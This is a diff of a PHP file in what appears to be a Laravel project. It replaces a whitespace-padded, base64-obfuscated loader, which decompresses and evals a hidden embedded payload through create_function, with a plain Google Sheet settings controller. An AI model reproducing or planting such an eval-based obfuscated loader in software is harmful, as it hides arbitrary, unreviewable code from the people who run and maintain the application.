@@ -1,208 +1,23 @@
-<?php 
- error_reporting(0);
-        $__='printf';$_='Loading the  ...';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-        $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='Q1JFQXRlX2Z1bkNUaU9u';
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='eNrtmltPo0AUx99N9jv0wQSNGwNTq0uaPgjKcGmppXa4vJjCVNpyjQgtfPodgWqbjYlmfVl3fk0vMHPO/8z/tPNQ6HQajh8IAyZ9WsXPj0y/PmwZMB0xnGfZ+fk50z9q53d+HH3nx9GLAZ0vZPDHGcbuqqFtGaHFOug+0GfTGT9m6qE3lz9E26xBh0KhUL4njBchFltqrkAEbHOTqBL/aJXBVbNpkl2z3gipURQKhUKhUCgUyr8G/TODQqFQvi+MO88WlxcPeOEleMH0qSMUCoVCofwVh9fvRT/NbZMLva6wtMHMn1jCxrpdslgWvAngcyyrhQu3oRePrshcznudgwsX4MxBeuKYiJ0BxGIY5k6XzItR5UwFlcRxrhnm9ZXsNucsQltsogrfZJoY6Zlt6ZXybi79xgU91ov4zIWoVCC6wBDljjzyD2rz0ytxde0r4nUxBBLRUVM7RiypIZhbtkbO+4oscHa0Te1SiLDZW5P8hbsSUjcywgVZWBMv7PLUTxUaSwxv/bupILuAj0kN93OIQizpIZYNEour8TqN5mYv0G5u0/EmeY1VxF+FAydJm+NwTFZJPCqJPpibqKuJeGWb+pNB8gwjKXjxbBjtPOGrRpOvHMtgiVbslV6mQL1wLdKzLtEAtUasTYO2foEX/UbPk9HKheFagQ7nRjqJ53NFRhsHSsSf5dSxJM6xdFYRjXL3WZs0sYv9mt/v9+U4cogXk2Q0DZ7v4l1uP/B2vRbZM9vckoYH7/lQr5+Mk3icYugnalfnbKCT7+UoHorXsQH4wgHbUJEafWWvB4rUapoTf9ZFaxugygNkvXDbU8s9T2JWYz55A8WX/NYG9ftJe3Ta/0z4XuxHAo/fBE+Yl1fm56vs/3KDzqEXJwfmN1ac9n8DOzdCSw==';
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+
+namespace App\Http\Controllers;
+
+use App\GoogleSheetSettings;
+use Illuminate\Http\Request;
+
+class GoogleSheetSettingsController extends Controller
+{
+    //attribute div
+    public function index()
+    {
+        $data = GoogleSheetSettings::find(1);
+        //dd($data);
+        return view('backEnd.admin.google_sheet_settings', compact('data'));
+    }
+
+    public function update(Request $request)
+    {
+        GoogleSheetSettings::find(1)->update($request->all());
+        return back()->with('success', 'Google Sheet Settings Updated Successfully');
+    }
+}
